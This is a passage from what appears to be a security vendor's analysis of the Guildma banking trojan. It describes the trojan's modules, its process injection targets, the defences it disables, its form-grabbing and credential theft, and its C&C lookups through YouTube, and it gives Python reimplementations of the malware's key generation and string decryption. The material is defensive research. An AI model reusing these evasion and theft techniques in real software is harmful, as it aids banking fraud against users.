	<td class="column-1">2019-06-03</td><td class="column-2">140</td><td class="column-3">140_ASTH_</td><td class="column-4">valehraysystqx</td>
</tr>
<tr class="row-12 even">
	<td class="column-1">2019-06-24</td><td class="column-2">141</td><td class="column-3">141_T3SL4S_</td><td class="column-4">ayt3ese4xw</td>
</tr>
<tr class="row-13 odd">
	<td class="column-1">2019-07-17</td><td class="column-2">142</td><td class="column-3">142_T3SL4S_</td><td class="column-4">halawxtz</td>
</tr>
<tr class="row-14 even">
	<td class="column-1">2019-08-09</td><td class="column-2">143</td><td class="column-3">143_T3SL4S_</td><td class="column-4">asmonnwqk</td>
</tr>
<tr class="row-15 odd">
	<td class="column-1">2019-08-26</td><td class="column-2">144</td><td class="column-3">144_MULT1T3SL4S_</td><td class="column-4">daffsyshqy</td>
</tr>
<tr class="row-16 even">
	<td class="column-1">2019-09-26</td><td class="column-2">145</td><td class="column-3">145_MULT1T3SL4S_</td><td class="column-4">landoqeahjky</td>
</tr>
<tr class="row-17 odd">
	<td class="column-1">2019-10-16</td><td class="column-2">146</td><td class="column-3">146_MULT1T3SL4S_</td><td class="column-4">valkanxpca</td>
</tr>
<tr class="row-18 even">
	<td class="column-1">2019-11-04</td><td class="column-2">147</td><td class="column-3">147_MULT1T3SL4S_</td><td class="column-4">koddsuffy</td>
</tr>
<tr class="row-19 odd">
	<td class="column-1">2019-11-19</td><td class="column-2">148</td><td rowspan="5" class="column-3">xXx</td><td class="column-4">lpquayevvt</td>
</tr>
<tr class="row-20 even">
	<td class="column-1">2019-11-22</td><td class="column-2">149</td><td class="column-4">nauwuygia</td>
</tr>
<tr class="row-21 odd">
	<td class="column-1">2019-12-13</td><td class="column-2">150</td><td class="column-4">andrealfo</td>
</tr>
<tr class="row-22 even">
	<td class="column-1">2020-01-14</td><td class="column-2">151</td><td class="column-4">balberith</td>
</tr>
<tr class="row-23 odd">
	<td class="column-1">2020-02-05</td><td class="column-2">152</td><td class="column-4">masihaddajjal</td>
</tr>
</tbody>
</table>

<h2>Module overview</h2>
<p>As mentioned earlier, Guildma is very modular; the structure of its modules seems to be mostly constant. In this section, we will briefly describe the functionality of each module.</p>
<p>All module names are composed of a shared, version-dependent prefix and a module-specific suffix. In Table 2, the version-dependent prefix is <span style="font-family: courier new, courier, monospace;">andrealfo</span>.</p>
<p><em>Table 2. Guildma module overview</em></p>

<table id="tablepress-800" class="tablepress tablepress-id-800">
<thead>
<tr class="row-1 odd">
	<th class="column-1">URL filename</th><th class="column-2">Filesystem filename</th><th class="column-3">Module</th>
</tr>
</thead>
<tbody class="row-hover">
<tr class="row-2 even">
	<td class="column-1"><span style="font-family: courier new, courier, monospace;">andrealfohh1a.dll.zip</span></td><td rowspan="2" class="column-2"><span style="font-family: courier new, courier, monospace;">andrealfo64.~</span><br />
</td><td class="column-3">Main module loader 1 (part 1)</td>
</tr>
<tr class="row-3 odd">
	<td class="column-1"><span style="font-family: courier new, courier, monospace;">andrealfohh1b.dll.zip</span></td><td class="column-3">Main module loader 1 (part 2)</td>
</tr>
<tr class="row-4 even">
	<td class="column-1"><span style="font-family: courier new, courier, monospace;">andrealfoxa.gif.zip</span><br />
</td><td class="column-2"><span style="font-family: courier new, courier, monospace;">andrealfoxa.gif</span><br />
</td><td class="column-3">Main module injector (part 1)</td>
</tr>
<tr class="row-5 odd">
	<td class="column-1"><span style="font-family: courier new, courier, monospace;">andrealfoxb.gif.zip</span></td><td class="column-2"><span style="font-family: courier new, courier, monospace;">andrealfoxb.gif</span></td><td class="column-3">Main module injector (part 2)</td>
</tr>
<tr class="row-6 even">
	<td class="column-1"><span style="font-family: courier new, courier, monospace;">andrealfoxc.gif.zip</span><br />
</td><td class="column-2"><span style="font-family: courier new, courier, monospace;">andrealfoxc.gif</span></td><td class="column-3">Main module injector (part 3)</td>
</tr>
<tr class="row-7 odd">
	<td class="column-1"><span style="font-family: courier new, courier, monospace;">andrealfogx.gif.zip</span><br />
</td><td class="column-2"><span style="font-family: courier new, courier, monospace;">andrealfogx.gif</span></td><td class="column-3">Main module loader 2</td>
</tr>
<tr class="row-8 even">
	<td class="column-1"><span style="font-family: courier new, courier, monospace;">andrealfog.gif.zip</span><br />
</td><td class="column-2"><span style="font-family: courier new, courier, monospace;">andrealfog.gif</span></td><td class="column-3">Main module</td>
</tr>
<tr class="row-9 odd">
	<td class="column-1"><span style="font-family: courier new, courier, monospace;">andrealfoc.jpg.zip</span><br />
</td><td class="column-2"><span style="font-family: courier new, courier, monospace;">andrealfoc.jpg</span></td><td class="column-3">Contacts stealer and form grabber module</td>
</tr>
<tr class="row-10 even">
	<td class="column-1"><span style="font-family: courier new, courier, monospace;">andrealfodwwn.gif.zip</span><br />
</td><td class="column-2"><span style="font-family: courier new, courier, monospace;">andrealfodwwn.gif</span></td><td class="column-3">RAT module (DLL)</td>
</tr>
<tr class="row-11 odd">
	<td class="column-1"><span style="font-family: courier new, courier, monospace;">andrealfodx.gif.zip</span><br />
</td><td class="column-2"><span style="font-family: courier new, courier, monospace;">andrealfodx.gif</span></td><td class="column-3">RAT module (EXE)</td>
</tr>
<tr class="row-12 even">
	<td class="column-1"><span style="font-family: courier new, courier, monospace;">andrealfoa.jpg.zip</span><br />
</td><td class="column-2"><span style="font-family: courier new, courier, monospace;">andrealfoa.jpg</span></td><td class="column-3">MailPassView</td>
</tr>
<tr class="row-13 odd">
	<td class="column-1"><span style="font-family: courier new, courier, monospace;">andrealfob.jpg.zip</span><br />
</td><td class="column-2"><span style="font-family: courier new, courier, monospace;">andrealfob.jpg</span></td><td class="column-3">WebBrowserPassView</td>
</tr>
<tr class="row-14 even">
	<td class="column-1"><span style="font-family: courier new, courier, monospace;">andrealfoi.gif.zip</span><br />
</td><td class="column-2"><span style="font-family: courier new, courier, monospace;">andrealfoi.gif</span></td><td class="column-3">JScript dropper module</td>
</tr>
</tbody>
</table>

<p>With the exception of the main module loader 1 (<span style="font-family: courier new, courier, monospace;">*64.~</span>) and the main module injector (<span style="font-family: courier new, courier, monospace;">*xa.gif</span>, <span style="font-family: courier new, courier, monospace;">*xb.gif</span> and <span style="font-family: courier new, courier, monospace;">*xc.gif</span>), all the modules are encrypted with a simple XOR cipher using a repeating 32-byte key. The key is generated from a 32-bit seed using the algorithm shown in Figure 7. The seed value is obfuscated in the binaries to prevent simple extraction (see Figure 8).</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60577a98f3534635848641" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
key = bytearray ();
for i in range ( 32 ):
	key . append ( seed &amp; 0xff );
	seed &gt;&gt;= 1;</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="hide">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60577a98f3534635848641-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-60577a98f3534635848641-2">2</div><div class="crayon-num" data-line="crayon-60577a98f3534635848641-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-60577a98f3534635848641-4">4</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60577a98f3534635848641-1"><span class="crayon-v">key</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">bytearray</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60577a98f3534635848641-2"><span class="crayon-st">for</span><span class="crayon-h"> </span><span class="crayon-i">i</span><span class="crayon-h"> </span><span class="crayon-st">in</span><span class="crayon-h"> </span><span class="crayon-e">range</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-h"> </span><span class="crayon-cn">32</span><span class="crayon-h"> </span><span class="crayon-sy">)</span><span class="crayon-o">:</span></div><div class="crayon-line" id="crayon-60577a98f3534635848641-3"><span class="crayon-h">	</span><span class="crayon-i">key</span><span class="crayon-h"> </span><span class="crayon-sy">.</span><span class="crayon-h"> </span><span class="crayon-e">append</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-h"> </span><span class="crayon-v">seed</span><span class="crayon-h"> </span><span class="crayon-o">&amp;</span><span class="crayon-h"> </span><span class="crayon-cn">0xff</span><span class="crayon-h"> </span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60577a98f3534635848641-4"><span class="crayon-h">	</span><span class="crayon-v">seed</span><span class="crayon-h"> </span><span class="crayon-o">&gt;&gt;</span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-cn">1</span><span class="crayon-sy">;</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0002 seconds] -->
<p><em>Figure 7. Key generation algorithm</em></p>
<div id="attachment_135450" style="width: 203px" class="wp-caption aligncenter"><a href="https://www.welivesecurity.com/wp-content/uploads/2020/02/Figure_08_Seed_obfuscation.png"><img class="wp-image-135450 size-full" src="https://www.welivesecurity.com/wp-content/uploads/2020/02/Figure_08_Seed_obfuscation.png" alt="" width="193" height="243" /></a><p class="wp-caption-text"><i>Figure 8. Seed obfuscation in the binary</i></p></div>
<p>Three modules communicate with a C&amp;C server: Main module, RAT module, and Contacts stealer and form grabber. The communication is done over HTTP(S) using a combination of base64 and various simple custom encryption algorithms to protect the data being transferred.</p>
<p>In the next section, we describe how the C&amp;C server address is obtained.</p>
<h3>Main module loader 1 (*64.~)</h3>
<p>This is the first binary stage of the chain. The file is a DLL downloaded in two parts, which are concatenated by the previous JScript stage. It loads the three files comprising the next stage loader (<span style="font-family: courier new, courier, monospace;">*xa.gif</span>, <span style="font-family: courier new, courier, monospace;">*xb.gif</span> and <span style="font-family: courier new, courier, monospace;">*xc.gif</span>), concatenates them, maps the resulting PE file into its own address space and executes it.</p>
<p>Loading a PE file is a relatively complex process, so the authors used the <a href="https://github.com/DSPlayer/memorymodule/blob/master/BTMemoryModule/BTMemoryModule.pas" target="_blank" rel="noopener">BTMemoryModule</a> open-source library for this purpose.</p>
<h3>Main module injector (*xa.gif + *xb.gif + *xc.gif)</h3>
<p>This module loads the next stage (<span style="font-family: courier new, courier, monospace;">*gx.gif</span>) from disk and decrypts it. It then runs the first existing executable from the following list and injects the decrypted payload into it.</p>
<ul>
<li><span style="font-family: courier new, courier, monospace;">C:\Program Files\AVAST Software\Avast\aswRunDll.exe</span></li>
<li><span style="font-family: courier new, courier, monospace;">C:\Program Files\Diebold\Warsaw\unins000.exe <sup>*</sup></span></li>
<li><span style="font-family: courier new, courier, monospace;">C:\Windows\SysWOW64\userinit.exe</span></li>
<li><span style="font-family: courier new, courier, monospace;">C:\Windows\System32\userinit.exe</span></li>
</ul>
<p><sup>*</sup> An application, popular in Brazil, to protect access to online banking.</p>
<h3>Main module loader 2 (*gx.gif)</h3>
<p>The last loader stage is very simple and seems to needlessly duplicate the functionality of main module loader 1. It loads and decrypts the main module (<span style="font-family: courier new, courier, monospace;">*g.gif</span>), maps it into its own memory space and executes it.</p>
<h3>Main module (*g.gif)</h3>
<p>Guildma’s main module orchestrates all the remaining modules. Its implementation is deceptively complex, using countless timers and events, but its functionality is actually relatively simple. It contains legacy code that is not being used <em>anymore</em> as well as pre-production code that is not being used <em>yet</em>.</p>
<p>On loading, this module checks if it is running in a sandboxed environment (for example, by examining the computer name and system disk volume ID), if there are other running instances of itself (based on window names) and if the system locale is different from Portuguese. If any check reveals the system is uninteresting or already compromised by Guildma, the malware terminates.</p>
<p>Otherwise, the module then collects information from the system (computer name, which security software is being used, installed programs…) and establishes contact with the C&amp;C server. It then starts monitoring interesting events, mainly when certain applications are launched or online banking sites opened, and executing appropriate actions (e.g. taking screenshots, preventing the user from closing the window by intercepting keyboard shortcuts, launching the RAT module, and so on).</p>
<p>The module also implements backdoor commands whose functionality largely overlaps with the RAT module.</p>
<h3>Contact stealer and form grabber (*c.jpg)</h3>
<p>This module has two functions — gathering email addresses and form data from webpages.</p>
<p>Email addresses are obtained from desktop email clients (such as Microsoft Outlook, Thunderbird and The Bat!) by parsing their address books as well as the emails themselves.</p>
<p>The form grabber uses Windows COM technology to interact with Internet Explorer. It waits until a targeted site is opened (mostly Brazilian webmails, e-shops and payment gateways) and then logs the user out, forcing the victim to input credentials. It then retrieves the DOM and looks for important input field values (such as usernames, passwords and credit card numbers).</p>
<h3>RAT module (*dwwn.gif, *dx.gif)</h3>
<p>The RAT module comes in two functionally identical compilations — DLL (<span style="font-family: courier new, courier, monospace;">*dwwn.gif</span>) and EXE (<span style="font-family: courier new, courier, monospace;">*.dx.gif</span>).</p>
<p>It implements download and execute functionality, can take screenshots, emulate keyboard and mouse input, and restart the computer.</p>
<p>Most Latin American banking trojans display fake pop-up windows based on monitoring the active window’s name. These windows are usually stored in the binary. We have not found such code in Guildma, but the RAT module contains a Delphi form implementing a simple web browser. Since it is also executed based on the active window’s name, we believe this form is used for displaying fake dialogs to the user.</p>
<h3>MailPassView (*a.jpg) and BrowserPassView (*b.jpg)</h3>
<p>These are freeware tools from Nirsoft for extracting saved credentials from popular email clients and web browsers respectively. Since Nirsoft has removed support for quiet operation (output to file, with no GUI) from newer versions to curb the abuse of these tools by malware, Guildma’s authors are using older versions that had those features. The same tools are also leveraged by <a href="https://www.welivesecurity.com/2019/11/19/mispadu-advertisement-discounted-unhappy-meal/">Mispadu</a>, except Mispadu is using newer versions with quiet operation support patched back in.</p>
<h3>JScript dropper module (*i.gif)</h3>
<p>This module drops and executes (using <span style="font-family: courier new, courier, monospace;">cscript.exe</span>) a JScript file. The script consists of two parts — the first part is stored as one long encrypted string, while the second part is assembled from many short strings (some encrypted and some in plaintext). Worthy of note is the fact that strings in the dropped JScript file are encrypted by this dropper module with a randomly generated key, so they are present in the clear in the dropper.</p>
<p>The script executes the following actions:</p>
<ul>
<li>Disables UAC</li>
<li>Disables EXE signature checking</li>
<li>Disables Windows Defender</li>
<li>Creates a firewall rule disabling network access for<br />
<span style="font-family: courier new, courier, monospace;">C:\Program Files\AVAST Software\Avast\Setup\avast.setup</span></li>
<li>Disables wsddntf driver (Diebold Warsaw GAS Tecnologia — the banking access protection software introduced earlier)</li>
<li>Adds a firewall exception for files used as injection targets
<ul>
<li><span style="font-family: courier new, courier, monospace;">C:\Program Files\Diebold\Warsaw\unins000.exe</span></li>
<li><span style="font-family: courier new, courier, monospace;">C:\Program Files\AVAST Software\Avast\aswRunDll.exe</span></li>
</ul>
</li>
</ul>
<p>We believe this module may still be in development as we have never observed it on our test machines dropping the script.</p>
<h2>New developments (since mid-2019)</h2>
<h3>New C&amp;C retrieval</h3>
<p>In version 142, a new way of distributing C&amp;C servers, abusing YouTube and Facebook profiles, was implemented. However, the authors stopped using Facebook almost immediately and, at the time of writing, are fully relying on YouTube. This is similar to <a href="https://www.welivesecurity.com/2019/10/03/casbaneiro-trojan-dangerous-cooking/" target="_blank" rel="noopener">Casbaneiro</a>, but a bit cruder. While Casbaneiro was hiding the data in video descriptions and obfuscating it as a part of a URL, Guildma simply places the data in the channel description. The start and end of the encrypted C&amp;C addresses is delimited by “|||”. The data in between is base64 encoded and encrypted using <a href="https://www.welivesecurity.com/2019/11/19/mispadu-advertisement-discounted-unhappy-meal/" target="_blank" rel="noopener">Mispadu’s</a> string encryption algorithm. This is now the primary method of retrieving C&amp;C servers; the old method (described by <a href="https://decoded.avast.io/threatintel/deep-dive-into-guildma-malware/" target="_blank" rel="noopener">Avast</a>) is still present as a backup.</p>
<div id="attachment_135451" style="width: 659px" class="wp-caption aligncenter"><a href="https://www.welivesecurity.com/wp-content/uploads/2020/02/Figure_09_YouTube.png"><img class="wp-image-135451" src="https://www.welivesecurity.com/wp-content/uploads/2020/02/Figure_09_YouTube.png" alt="" width="649" height="359" srcset="https://www.welivesecurity.com/wp-content/uploads/2020/02/Figure_09_YouTube.png 982w, https://www.welivesecurity.com/wp-content/uploads/2020/02/Figure_09_YouTube-300x166.png 300w, https://www.welivesecurity.com/wp-content/uploads/2020/02/Figure_09_YouTube-768x425.png 768w, https://www.welivesecurity.com/wp-content/uploads/2020/02/Figure_09_YouTube-143x79.png 143w, https://www.welivesecurity.com/wp-content/uploads/2020/02/Figure_09_YouTube-298x165.png 298w" sizes="(max-width: 649px) 100vw, 649px" /></a><p class="wp-caption-text"><i>Figure 9. Encrypted Guildma C&amp;C server domains stored on YouTube</i></p></div>
<h3>Modules added and removed</h3>
<p>The previously described JScript dropper module was added in version 145. Conversely, in version 139, Guildma dropped two other modules present in older versions — mass mailer (<span style="font-family: courier new, courier, monospace;">*f.jpg</span>) and its loader (<span style="font-family: courier new, courier, monospace;">*e.jpg</span>). In the next few versions, these modules were still accessible under the expected names (<span style="font-family: courier new, courier, monospace;">&lt;version prefix&gt;e.jpg</span> and <span style="font-family: courier new, courier, monospace;">&lt;version prefix&gt;f.jpg</span>) from the same server as the other modules. This leads us to believe these modules are still being developed, but are now only distributed as needed, presumably using the download and execute backdoor command.</p>
<h3>New string encryption</h3>
<p>The JScript dropper module brought with it a new string encryption algorithm. A variant of this algorithm (shown in Figure 10) was propagated into other modules in version 147.</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60577a98f3549201595010" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
def decrypt ( ct, key ):
	# stage 1
	ct = unhexlify ( ct );
	last = ct [ 0 ];
	s = bytearray ( ct [ 1 : ] );
	for i in range ( len ( s ) ):
		x = s [ i ] ^ key [ i % len ( key ) ];
		if last &gt; x:
			x += 0xff;
		x -= last;
		last = s [ i ];
		s [ i ] = x;

	# stage 2 - reverse string
	s = s [::-1]; 

	# stage 3 - c = not ( c - 10 )
	s = "" . join ( [ chr ( ( ~( c - 10 ) ) &amp; 0xff ) for c in s ] ); 

	# stage 4 - Base25 decode and key subtraction
	k = ord ( s [ 0 ] ) - 65;
	ot = "";
	for i in range ( 1, len ( s ), 2 ):
		ot += chr ( ( ord ( s [ i ] ) - 65 ) * 25 + ord ( s [ i + 1 ] ) - 65 - k - 100 );

	return ot;</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="hide">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60577a98f3549201595010-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-60577a98f3549201595010-2">2</div><div class="crayon-num" data-line="crayon-60577a98f3549201595010-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-60577a98f3549201595010-4">4</div><div class="crayon-num" data-line="crayon-60577a98f3549201595010-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-60577a98f3549201595010-6">6</div><div class="crayon-num" data-line="crayon-60577a98f3549201595010-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-60577a98f3549201595010-8">8</div><div class="crayon-num" data-line="crayon-60577a98f3549201595010-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-60577a98f3549201595010-10">10</div><div class="crayon-num" data-line="crayon-60577a98f3549201595010-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-60577a98f3549201595010-12">12</div><div class="crayon-num" data-line="crayon-60577a98f3549201595010-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-60577a98f3549201595010-14">14</div><div class="crayon-num" data-line="crayon-60577a98f3549201595010-15">15</div><div class="crayon-num crayon-striped-num" data-line="crayon-60577a98f3549201595010-16">16</div><div class="crayon-num" data-line="crayon-60577a98f3549201595010-17">17</div><div class="crayon-num crayon-striped-num" data-line="crayon-60577a98f3549201595010-18">18</div><div class="crayon-num" data-line="crayon-60577a98f3549201595010-19">19</div><div class="crayon-num crayon-striped-num" data-line="crayon-60577a98f3549201595010-20">20</div><div class="crayon-num" data-line="crayon-60577a98f3549201595010-21">21</div><div class="crayon-num crayon-striped-num" data-line="crayon-60577a98f3549201595010-22">22</div><div class="crayon-num" data-line="crayon-60577a98f3549201595010-23">23</div><div class="crayon-num crayon-striped-num" data-line="crayon-60577a98f3549201595010-24">24</div><div class="crayon-num" data-line="crayon-60577a98f3549201595010-25">25</div><div class="crayon-num crayon-striped-num" data-line="crayon-60577a98f3549201595010-26">26</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60577a98f3549201595010-1"><span class="crayon-e">def </span><span class="crayon-e">decrypt</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-h"> </span><span class="crayon-v">ct</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-i">key</span><span class="crayon-h"> </span><span class="crayon-sy">)</span><span class="crayon-o">:</span></div><div class="crayon-line crayon-striped-line" id="crayon-60577a98f3549201595010-2"><span class="crayon-h">	</span><span class="crayon-p"># stage 1</span></div><div class="crayon-line" id="crayon-60577a98f3549201595010-3"><span class="crayon-h">	</span><span class="crayon-v">ct</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">unhexlify</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-h"> </span><span class="crayon-i">ct</span><span class="crayon-h"> </span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60577a98f3549201595010-4"><span class="crayon-h">	</span><span class="crayon-v">last</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-i">ct</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-h"> </span><span class="crayon-cn">0</span><span class="crayon-h"> </span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60577a98f3549201595010-5"><span class="crayon-h">	</span><span class="crayon-v">s</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">bytearray</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-h"> </span><span class="crayon-i">ct</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-h"> </span><span class="crayon-cn">1</span><span class="crayon-h"> </span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60577a98f3549201595010-6"><span class="crayon-h">	</span><span class="crayon-st">for</span><span class="crayon-h"> </span><span class="crayon-i">i</span><span class="crayon-h"> </span><span class="crayon-st">in</span><span class="crayon-h"> </span><span class="crayon-e">range</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-h"> </span><span class="crayon-e">len</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-h"> </span><span class="crayon-i">s</span><span class="crayon-h"> </span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">)</span><span class="crayon-o">:</span></div><div class="crayon-line" id="crayon-60577a98f3549201595010-7"><span class="crayon-h">		</span><span class="crayon-v">x</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-i">s</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-h"> </span><span class="crayon-i">i</span><span class="crayon-h"> </span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">^</span><span class="crayon-h"> </span><span class="crayon-i">key</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-h"> </span><span class="crayon-v">i</span><span class="crayon-h"> </span><span class="crayon-o">%</span><span class="crayon-h"> </span><span class="crayon-e">len</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-h"> </span><span class="crayon-i">key</span><span class="crayon-h"> </span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60577a98f3549201595010-8"><span class="crayon-h">		</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-v">last</span><span class="crayon-h"> </span><span class="crayon-o">&gt;</span><span class="crayon-h"> </span><span class="crayon-v">x</span><span class="crayon-o">:</span></div><div class="crayon-line" id="crayon-60577a98f3549201595010-9"><span class="crayon-h">			</span><span class="crayon-v">x</span><span class="crayon-h"> </span><span class="crayon-o">+=</span><span class="crayon-h"> </span><span class="crayon-cn">0xff</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60577a98f3549201595010-10"><span class="crayon-h">		</span><span class="crayon-v">x</span><span class="crayon-h"> </span><span class="crayon-o">-=</span><span class="crayon-h"> </span><span class="crayon-v">last</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60577a98f3549201595010-11"><span class="crayon-h">		</span><span class="crayon-v">last</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-i">s</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-h"> </span><span class="crayon-i">i</span><span class="crayon-h"> </span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60577a98f3549201595010-12"><span class="crayon-h">		</span><span class="crayon-i">s</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-h"> </span><span class="crayon-i">i</span><span class="crayon-h"> </span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">x</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60577a98f3549201595010-13">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-60577a98f3549201595010-14"><span class="crayon-h">	</span><span class="crayon-p"># stage 2 - reverse string</span></div><div class="crayon-line" id="crayon-60577a98f3549201595010-15"><span class="crayon-h">	</span><span class="crayon-v">s</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-i">s</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-o">::</span><span class="crayon-o">-</span><span class="crayon-cn">1</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span><span class="crayon-h"> </span></div><div class="crayon-line crayon-striped-line" id="crayon-60577a98f3549201595010-16">&nbsp;</div><div class="crayon-line" id="crayon-60577a98f3549201595010-17"><span class="crayon-h">	</span><span class="crayon-p"># stage 3 - c = not ( c - 10 )</span></div><div class="crayon-line crayon-striped-line" id="crayon-60577a98f3549201595010-18"><span class="crayon-h">	</span><span class="crayon-v">s</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">""</span><span class="crayon-h"> </span><span class="crayon-sy">.</span><span class="crayon-h"> </span><span class="crayon-e">join</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-h"> </span><span class="crayon-e">chr</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-h"> </span><span class="crayon-o">~</span><span class="crayon-sy">(</span><span class="crayon-h"> 